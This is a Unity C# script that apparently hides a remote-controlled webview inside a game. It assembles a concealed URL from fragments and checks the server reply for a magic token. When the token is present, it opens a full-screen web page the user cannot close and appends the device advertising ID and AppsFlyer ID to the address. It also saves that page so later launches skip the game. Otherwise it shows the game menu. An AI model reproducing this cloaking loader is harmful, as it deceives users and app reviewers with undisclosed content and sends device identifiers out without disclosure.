using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainAP : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneAPName = "";
    [HideInInspector] public string twoAPName = "";
       
            

    private IEnumerator IENUMENATORAP()
    {
        using (UnityWebRequest ap = UnityWebRequest.Get(twoAPName))
        {

            yield return ap.SendWebRequest();
            if (ap.isNetworkError)
            {
                GoingAP();
            }
            int projectionAP = 3;
            while (PlayerPrefs.GetString("glrobo", "") == "" && projectionAP > 0)
            {
                yield return new WaitForSeconds(1);
                projectionAP--;
            }
            try
            {
                if (ap.result == UnityWebRequest.Result.Success)
                {
                    if (ap.downloadHandler.text.Contains("ngrPltKNzxvbew"))
                    {

                        try
                        {
                            var subs = ap.downloadHandler.text.Split('|');
                            MESHAPLOOK(subs[0] + "?idfa=" + oneAPName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            MESHAPLOOK(ap.downloadHandler.text + "?idfa=" + oneAPName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        GoingAP();
                    }
                }
                else
                {
                    GoingAP();
                }
            }
            catch
            {
                GoingAP();
            }
        }
    }

    

    private void GoingAP()
    {
        Screen.orientation = ScreenOrientation.LandscapeLeft;
        SceneManager.LoadScene("Menu");
    }

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("PleaAPconnection", string.Empty) != string.Empty)
            {
                MESHAPLOOK(PlayerPrefs.GetString("PleaAPconnection"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoAPName += n;
                }
                StartCoroutine(IENUMENATORAP());
            }
        }
        else
        {
            GoingAP();
        }
    }



    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaAP") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneAPName = advertisingId; });
        }
    }

    private void MESHAPLOOK(string PleaAPconnection, string NamingAP = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _denesAP = gameObject.AddComponent<UniWebView>();
        _denesAP.SetToolbarDoneButtonText("");
        switch (NamingAP)
        {
            case "0":
                _denesAP.SetShowToolbar(true, false, false, true);
                break;
            default:
                _denesAP.SetShowToolbar(false);
                break;
        }
        _denesAP.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _denesAP.OnShouldClose += (view) =>
        {
            return false;
        };
        _denesAP.SetSupportMultipleWindows(true);
        _denesAP.SetAllowBackForwardNavigationGestures(true);
        _denesAP.OnMultipleWindowOpened += (view, windowId) =>
        {
            _denesAP.SetShowToolbar(true);

        };
        _denesAP.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingAP)
            {
                case "0":
                    _denesAP.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _denesAP.SetShowToolbar(false);
                    break;
            }
        };
        _denesAP.OnOrientationChanged += (view, orientation) =>
        {
            _denesAP.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _denesAP.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("PleaAPconnection", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("PleaAPconnection", url);
            }
        };
        _denesAP.Load(PleaAPconnection);
        _denesAP.Show();
    }
}
